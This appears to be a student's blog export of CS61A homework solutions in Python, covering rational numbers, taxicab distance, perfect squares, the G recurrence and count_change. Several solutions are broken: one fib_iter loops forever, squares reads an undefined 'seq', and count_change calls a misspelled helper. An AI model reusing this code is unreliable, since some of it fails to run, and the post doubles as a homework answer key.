<p>combiner, base, term and n: the same arguments as accumulate.<br>pred: a one-argument predicate function applied to the values of term(k) for each k from 1 to n. Only values for which pred returns a true value are included in the accumulated total. If no values satisfy pred, then base is returned.<br>For example, the result of filtered_accumulate(add, 0, is_prime, 11, identity) is</p>
<p>0 + 2 + 3 + 5 + 7 + 11<br>for a valid definition of is_prime.</p>
<p>Implement filtered_accumulate by defining the combine_if function. Exactly what this function does is something for you to discover. Do not use any loops or make any recursive calls to filtered_accumulate.</p>
<p>Hint: The order in which you pass the arguments to combiner in your solution to accumulate matters here.</p>
]]></content>
      <categories>
        <category>CS61A</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>SICP</tag>
      </tags>
  </entry>
  <entry>
    <title>cs61a-hw04</title>
    <url>/2018/10/07/cs61a-hw04/</url>
    <content><![CDATA[<h1 id="Lecture-Code"><a href="#Lecture-Code" class="headerlink" title="Lecture Code"></a>Lecture Code</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_iter</span><span class="params">(n)</span>:</span></span><br><span class="line">    i = <span class="number">0</span></span><br><span class="line">    curr, next = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        curr, next = next, curr + next</span><br><span class="line">    	   i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> curr</span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Rational arithmetic</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_rational</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""The sum of rational numbers X and Y."""</span></span><br><span class="line">    nx, dx = numer(x), denom(x)</span><br><span class="line">    ny, dy = numer(y), denom(y)</span><br><span class="line">    <span class="keyword">return</span> rational(nx * dy + ny * dx, dx * dy)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mul_rational</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""The product of rational numbers X and Y."""</span></span><br><span class="line">    <span class="keyword">return</span> rational(numer(x) * numer(y), denom(x) * denom(y))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rationals_are_equal</span><span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">"""True iff rational numbers X and Y are equal."""</span></span><br><span class="line">    <span class="keyword">return</span> numer(x) * denom(y) == numer(y) * denom(x)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_rational</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Print rational X."""</span></span><br><span class="line">    print(numer(x), <span class="string">"/"</span>, denom(x))</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Constructor and selectors</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    <span class="string">"""A representation of the rational number N/D."""</span></span><br><span class="line">    <span class="keyword">return</span> [n, d]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numer</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the numerator of rational number X."""</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denom</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the denominator of rational number X."""</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Improved specification</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> fractions <span class="keyword">import</span> gcd</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    <span class="string">"""A representation of the rational number N/D."""</span></span><br><span class="line">    g = gcd(n, d)</span><br><span class="line">    <span class="keyword">return</span> [n//g, d//g]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numer</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the numerator of rational number X in lowest terms and having</span></span><br><span class="line"><span class="string">    the sign of X."""</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denom</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the denominator of rational number X in lowest terms and positive."""</span></span><br><span class="line">    <span class="keyword">return</span> x[<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Functional implementation</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational</span><span class="params">(n, d)</span>:</span></span><br><span class="line">    <span class="string">"""A representation of the rational number N/D."""</span></span><br><span class="line">    g = gcd(n, d)</span><br><span class="line">    n, d = n//g, d//g</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">select</span><span class="params">(name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> name == <span class="string">'n'</span>:</span><br><span class="line">            <span class="keyword">return</span> n</span><br><span class="line">        <span class="keyword">elif</span> name == <span class="string">'d'</span>:</span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="keyword">return</span> select</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">numer</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the numerator of rational number X in lowest terms and having</span></span><br><span class="line"><span class="string">    the sign of X."""</span></span><br><span class="line">    <span class="keyword">return</span> x(<span class="string">'n'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">denom</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">"""Return the denominator of rational number X in lowest terms and positive."""</span></span><br><span class="line">    <span class="keyword">return</span> x(<span class="string">'d'</span>)</span><br></pre></td></tr></table></figure>

<p>Containers</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># Lists</span></span><br><span class="line"></span><br><span class="line">odds = [<span class="number">41</span>, <span class="number">43</span>, <span class="number">47</span>, <span class="number">49</span>]</span><br><span class="line">len(odds)</span><br><span class="line">odds[<span class="number">1</span>]</span><br><span class="line">odds[<span class="number">0</span>] - odds[<span class="number">3</span>] + len(odds)</span><br><span class="line">odds[odds[<span class="number">3</span>]-odds[<span class="number">2</span>]]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Containers</span></span><br><span class="line"></span><br><span class="line">digits = [<span class="number">1</span>, <span class="number">8</span>, <span class="number">2</span>, <span class="number">8</span>]</span><br><span class="line"><span class="number">1</span> <span class="keyword">in</span> digits</span><br><span class="line"><span class="string">'1'</span> <span class="keyword">in</span> digits</span><br><span class="line">[<span class="number">1</span>, <span class="number">8</span>] <span class="keyword">in</span> digits</span><br><span class="line">[<span class="number">1</span>, <span class="number">2</span>] <span class="keyword">in</span> [[<span class="number">1</span>, <span class="number">2</span>], <span class="number">3</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># For statements</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_while</span><span class="params">(s, value)</span>:</span></span><br><span class="line">    <span class="string">"""Count the number of occurrences of value in sequence s.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_while(digits, 8)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    total, index = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> index &lt; len(s):</span><br><span class="line">        <span class="keyword">if</span> s[index] == value:</span><br><span class="line">            total = total + <span class="number">1</span></span><br><span class="line">        index = index + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_for</span><span class="params">(s, value)</span>:</span></span><br><span class="line">    <span class="string">"""Count the number of occurrences of value in sequence s.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_for(digits, 8)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> elem <span class="keyword">in</span> s:</span><br><span class="line">        <span class="keyword">if</span> elem == value:</span><br><span class="line">            total = total + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_same</span><span class="params">(pairs)</span>:</span></span><br><span class="line">    <span class="string">"""Return how many pairs have the same element repeated.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; pairs = [[1, 2], [2, 2], [2, 3], [4, 4]]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_same(pairs)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    same_count = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> x, y <span class="keyword">in</span> pairs:</span><br><span class="line">        <span class="keyword">if</span> x == y:</span><br><span class="line">            same_count = same_count + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> same_count</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Ranges</span></span><br><span class="line"></span><br><span class="line">list(range(<span class="number">5</span>, <span class="number">8</span>))</span><br><span class="line">list(range(<span class="number">4</span>))</span><br><span class="line">len(range(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sum_below</span><span class="params">(n)</span>:</span></span><br><span class="line">    total = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">        total += i</span><br><span class="line">    <span class="keyword">return</span> total</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheer</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> range(<span class="number">3</span>):</span><br><span class="line">        print(<span class="string">'Go Bears!'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># List comprehensions</span></span><br><span class="line"></span><br><span class="line">odds = [<span class="number">1</span>, <span class="number">3</span>, <span class="number">5</span>, <span class="number">7</span>, <span class="number">9</span>]</span><br><span class="line">[x+<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> odds]</span><br><span class="line">[x <span class="keyword">for</span> x <span class="keyword">in</span> odds <span class="keyword">if</span> <span class="number">25</span> % x == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">divisors</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the integers that evenly divide n.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; divisors(4)</span></span><br><span class="line"><span class="string">    [1, 2]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; divisors(12)</span></span><br><span class="line"><span class="string">    [1, 2, 3, 4, 6]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; [n for n in range(1, 1000) if sum(divisors(n)) == n]</span></span><br><span class="line"><span class="string">    [6, 28, 496]</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">return</span> [x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>, n) <span class="keyword">if</span> n % x == <span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Dicts</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dict_demos</span><span class="params">()</span>:</span></span><br><span class="line">    numerals = &#123;<span class="string">'I'</span>: <span class="number">1</span>, <span class="string">'V'</span>: <span class="number">5</span>, <span class="string">'X'</span>: <span class="number">10</span>&#125;</span><br><span class="line">    numerals[<span class="string">'X'</span>]</span><br><span class="line">    numerals.values()</span><br><span class="line">    list(numerals.values())</span><br><span class="line">    sum(numerals.values())</span><br><span class="line">    dict([(<span class="number">3</span>, <span class="number">9</span>), (<span class="number">4</span>, <span class="number">16</span>), (<span class="number">5</span>, <span class="number">25</span>)])</span><br><span class="line">    numerals.get(<span class="string">'X'</span>, <span class="number">0</span>)</span><br><span class="line">    numerals.get(<span class="string">'X-ray'</span>, <span class="number">0</span>)</span><br><span class="line">    &#123;x: x*x <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">3</span>,<span class="number">6</span>)&#125;</span><br><span class="line"></span><br><span class="line">    &#123;<span class="number">1</span>: <span class="number">2</span>, <span class="number">1</span>: <span class="number">3</span>&#125;</span><br><span class="line">    &#123;[<span class="number">1</span>]: <span class="number">2</span>&#125;</span><br><span class="line">    &#123;<span class="number">1</span>: [<span class="number">2</span>]&#125;</span><br></pre></td></tr></table></figure>

<h1 id="Q1-Taxicab-Distance"><a href="#Q1-Taxicab-Distance" class="headerlink" title="Q1: Taxicab Distance"></a>Q1: Taxicab Distance</h1><p>An intersection in midtown Manhattan can be identified by an avenue and a street, which are both indexed by positive integers. The Manhattan distance or taxicab distance between two intersections is the number of blocks that must be traversed to reach one from the other, ignoring one-way street restrictions and construction. For example, Times Square is on 46th Street and 7th Avenue. Ess-a-Bagel is on 51st Street and 3rd Avenue. The taxicab distance between them is 9 blocks (5 blocks from 46th to 51st street and 4 blocks from 7th avenue to 3rd avenue). Taxicabs cannot cut diagonally through buildings to reach their destination!</p>
<p>Implement taxicab, which computes the taxicab distance between two intersections using the following data abstraction. <em>Hint</em>: You don’t need to know what a Cantor pairing function is; just use the abstraction.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">intersection</span><span class="params">(st, ave)</span>:</span></span><br><span class="line">    <span class="string">"""Represent an intersection using the Cantor pairing function."""</span></span><br><span class="line">    <span class="keyword">return</span> (st+ave)*(st+ave+<span class="number">1</span>)//<span class="number">2</span> + ave</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">street</span><span class="params">(inter)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> w(inter) - avenue(inter)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">avenue</span><span class="params">(inter)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> inter - (w(inter) ** <span class="number">2</span> + w(inter)) // <span class="number">2</span></span><br><span class="line"></span><br><span class="line">w = <span class="keyword">lambda</span> z: int(((<span class="number">8</span>*z+<span class="number">1</span>)**<span class="number">0.5</span><span class="number">-1</span>)/<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">taxicab</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="string">"""Return the taxicab distance between two intersections.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; times_square = intersection(46, 7)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; ess_a_bagel = intersection(51, 3)</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; taxicab(times_square, ess_a_bagel)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; taxicab(ess_a_bagel, times_square)</span></span><br><span class="line"><span class="string">    9</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> abs(street(a) - street(b)) + abs(avenue(a) - avenue(b))</span><br></pre></td></tr></table></figure>
<h1 id="Q2-Squares-only"><a href="#Q2-Squares-only" class="headerlink" title="Q2:Squares only"></a>Q2:Squares only</h1><p>Implement the function <code>squares</code>, which takes in a list of positive integers. It returns a list that contains the square roots of the elements of the original list that are perfect squares. Try using a list comprehension.</p>
<p>You may find the round function useful.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">10.5</span>)</span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>round(<span class="number">10.51</span>)</span><br><span class="line"><span class="number">11</span></span><br></pre></td></tr></table></figure>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> math <span class="keyword">import</span> sqrt</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">squares</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Returns a new list containing square roots of the elements of the</span></span><br><span class="line"><span class="string">    original list that are perfect squares.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; seq = [8, 49, 8, 9, 2, 1, 100, 102]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; squares(seq)</span></span><br><span class="line"><span class="string">    [7, 3, 1, 10]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; seq = [500, 30]</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; squares(seq)</span></span><br><span class="line"><span class="string">    []</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">return</span> [sqrt(x) <span class="keyword">for</span> x <span class="keyword">in</span> seq <span class="keyword">if</span> x == round(sqrt(x)) ** <span class="number">2</span>]</span><br><span class="line">    <span class="comment"># return [round(x ** 0.5) for x in seq if x == round(x ** 0.5) ** 2]</span></span><br></pre></td></tr></table></figure>
<p>It might be helpful to construct a skeleton list comprehension to begin with:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">[sqrt(x) <span class="keyword">for</span> x <span class="keyword">in</span> s <span class="keyword">if</span> is_perfect_square(x)]</span><br></pre></td></tr></table></figure>
<p>This is great, but it requires that we have an is_perfect_square function. How might we check if something is a perfect square?</p>
<p>If the square root of a number is a whole number, then it is a perfect square. For example, sqrt(61) = 7.81024… (not a perfect square) and sqrt(49) = 7 (perfect square).<br>Once we obtain the square root of the number, we just need to check if something is a whole number. The is_perfect_square function might look like:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_perfect_square</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> is_whole(sqrt(x))</span><br></pre></td></tr></table></figure>

<p>One last piece of the puzzle: to check if a number is whole, we just need to see if it has a decimal or not. The way we’ve chosen to do it in the solution is to compare the original number to the round version (thus removing all decimals), but a technique employing floor division (//) or something else entirely could work too.<br>We’ve written all these helper functions to solve this problem, but they are actually all very short. Therefore, we can just copy the body of each into the original list comprehension, arriving at the solution we finally present.</p>
<p>Video walkthrough: <a href="https://youtu.be/YwLFB9paET0" target="_blank" rel="noopener">https://youtu.be/YwLFB9paET0</a></p>
<p>We can also use <code>pow</code> function to calculate the power of some number. And <code>int(pow(n, 0.5)) == pow(n, 0.5)</code> can judge whether or nor n is perfect square number.</p>
<h1 id="Q3-G-function"><a href="#Q3-G-function" class="headerlink" title="Q3:G function"></a>Q3:G function</h1><p>A mathematical function <code>G</code> on positive integers is defined by two cases:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">G(n) &#x3D; n,                                       if n &lt;&#x3D; 3</span><br><span class="line">G(n) &#x3D; G(n - 1) + 2 * G(n - 2) + 3 * G(n - 3),  if n &gt; 3</span><br></pre></td></tr></table></figure>
<p>Write a recursive function <code>g</code> that computes <code>G(n)</code>. Then, write an iterative function <code>g_iter</code> that also computes <code>G(n)</code>:<br><em>Hint: The <code>fibonacci</code> example in the tree recursion lecture is a good illustration of the relationship between the recursive and iterative definitions of a tree recursive problem.</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">def</span> <span class="title">g</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the value of G(n), computed recursively.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g(3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g(4)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g(5)</span></span><br><span class="line"><span class="string">    22</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'g', ['While', 'For'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="keyword">if</span> n &lt;= <span class="number">3</span>: <span class="comment"># n in (1,2,3)</span></span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> g(n - <span class="number">1</span>) + <span class="number">2</span> * g(n - <span class="number">2</span>) + <span class="number">3</span> * g(n - <span class="number">3</span>)</span><br><span class="line"><span class="comment"># My solution which is like the lecture code(fibnacci sequence iteration)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g_iter</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">"""Return the value of G(n), computed iteratively.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g_iter(1)</span></span><br><span class="line"><span class="string">    1</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g_iter(2)</span></span><br><span class="line"><span class="string">    2</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g_iter(3)</span></span><br><span class="line"><span class="string">    3</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g_iter(4)</span></span><br><span class="line"><span class="string">    10</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; g_iter(5)</span></span><br><span class="line"><span class="string">    22</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'g_iter', ['Recursion'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    current, middle, next = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> i &lt; n:</span><br><span class="line">        current, middle, next = middle, next, next + middle * <span class="number">2</span> + current * <span class="number">3</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> current</span><br></pre></td></tr></table></figure>
<p>The PDF solution</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g_iter2</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">1</span> <span class="keyword">or</span> n == <span class="number">2</span> <span class="keyword">or</span> n == <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">return</span> n</span><br><span class="line">    a, b, c = <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">3</span>:</span><br><span class="line">        a, b, c = b, c, c + <span class="number">2</span>*b + <span class="number">3</span>*a</span><br><span class="line">        n = n - <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> c</span><br></pre></td></tr></table></figure>
<p>This is an example of how a function might be easier to write recursively versus iteratively. Since we have defined the g function in terms of older versions of itself, the solution tends very naturally towards recursion.</p>
<p>The iterative solution is trickier, since we can only track a finite amount of state at a given time. We need to pick our variables carefully so that we have just the information we need to calculate the next step. In a sense, this problem is very similar to the Fibonacci sequence (assuming we start at the 0th Fibonacci number):</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">f(n) = n,               <span class="keyword">if</span> n &lt;= <span class="number">2</span></span><br><span class="line">f(n) = f(n<span class="number">-1</span>) + f(n<span class="number">-2</span>), <span class="keyword">if</span> n &gt; <span class="number">2</span></span><br></pre></td></tr></table></figure>
<p>As you may recall, the solution for Fibonacci carried two variables around for the two previous values.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fib_iter</span><span class="params">(n)</span>:</span></span><br><span class="line">    prev, curr = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> n &gt; <span class="number">0</span>:</span><br><span class="line">        prev, curr = curr, prev + curr</span><br><span class="line">    <span class="keyword">return</span> prev</span><br></pre></td></tr></table></figure>
<p>Since the g function depends on the three previous values, it might make sense that we might have to track three values instead!</p>
<p>Consider the three previous values old, older, and oldest. To do an update, the older value ages and becomes oldest, the old value ages and becomes older. Finally, old gets the new value which is derived from the three previous values: old + 2 * older + 3 * oldest.</p>
<p><span style="color:red">Video walkthrough: <a href="https://youtu.be/pltx7u2kGGE" target="_blank" rel="noopener">https://youtu.be/pltx7u2kGGE</a></span></p>
<h1 id="Q4-Count-change"><a href="#Q4-Count-change" class="headerlink" title="Q4: Count change"></a>Q4: Count change</h1><p>Once the machines take over, the denomination of every coin will be a power of two: 1-cent, 2-cent, 4-cent, 8-cent, 16-cent, etc. There will be no limit to how much a coin can be worth.</p>
<p>Given a positive integer <code>amount</code>, a set of coins makes change for <code>amount</code> if the sum of the values of the coins is <code>amount</code>. For example, the following sets make change for <code>7</code>:</p>
<ul>
<li>7 1-cent coins</li>
<li>5 1-cent, 1 2-cent coins</li>
<li>3 1-cent, 2 2-cent coins</li>
<li>3 1-cent, 1 4-cent coins</li>
<li>1 1-cent, 3 2-cent coins</li>
<li>1 1-cent, 1 2-cent, 1 4-cent coins<br>Thus, there are 6 ways to make change for <code>7</code>. Write a recursive function <code>count_change</code> that takes a positive integer <code>amount</code> and returns the number of ways to make change for <code>amount</code> using these coins of the future.</li>
</ul>
<p><em>Hint: Refer the implementation of <code>count_partitions</code> for an example of how to count the ways to sum up to an amount with smaller parts. If you need to keep track of more than one value across recursive calls, consider writing a helper function.</em></p>
<p><span style="color:red">My solution: First find the largest denomination in our change, which is implemented by a while loop, then we find that the program is so like the count_partitions program, we think about this problem as either having the largest denomination or not having it. Then we use tree recursion to calculate the result.</span></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">count_change</span><span class="params">(amount)</span>:</span></span><br><span class="line">    <span class="string">"""Return the number of ways to make change for amount.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(7)</span></span><br><span class="line"><span class="string">    6</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(10)</span></span><br><span class="line"><span class="string">    14</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(20)</span></span><br><span class="line"><span class="string">    60</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; count_change(100)</span></span><br><span class="line"><span class="string">    9828</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; from construct_check import check</span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; check(HW_SOURCE_FILE, 'count_change', ['While', 'For'])</span></span><br><span class="line"><span class="string">    True</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="string">"*** YOUR CODE HERE ***"</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">lessThanN</span><span class="params">(n)</span>:</span></span><br><span class="line">        i = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> i &lt;= n:</span><br><span class="line">            i *= <span class="number">2</span></span><br><span class="line">        <span class="keyword">return</span> i // <span class="number">2</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">change</span><span class="params">(amount, m)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> amount &lt; <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">        <span class="keyword">elif</span> m == <span class="number">1</span> <span class="keyword">or</span> amount == <span class="number">0</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> change(amount - m, m) + change(amount, m // <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> change(amount, lessthanN(amount))</span><br></pre></td></tr></table></figure>
<p><span style="color:red">PDF solution, I think PDF solution is cleverer than mine, it uses the smallest denomination, which needn’t to implement a <code>lessThanN</code> function, but the intrinsic mind is the same.</span></p>
<p>This is remarkably similar to the count_partitions problem, with a few minor differences:</p>
<ul>
<li>A maximum partition size m is not given, so we need to create a helper function that takes in two arguments and also create another helper function to find the max coin.</li>
<li>Partition size is not linear, but rather multiples of two. To get the next partition you need to divide by two instead of subtracting one.<br>One other implementation detail here is that we enforce a maximum partition size, rather than a minimum coin. Many students attempted to start at 1 and work there way up. That will also work, but is less similar to count_partitions. As long as there is some ordering on the coins being enforced, we ensure we cover all the combinations of coins without any duplicates.</li>
</ul>
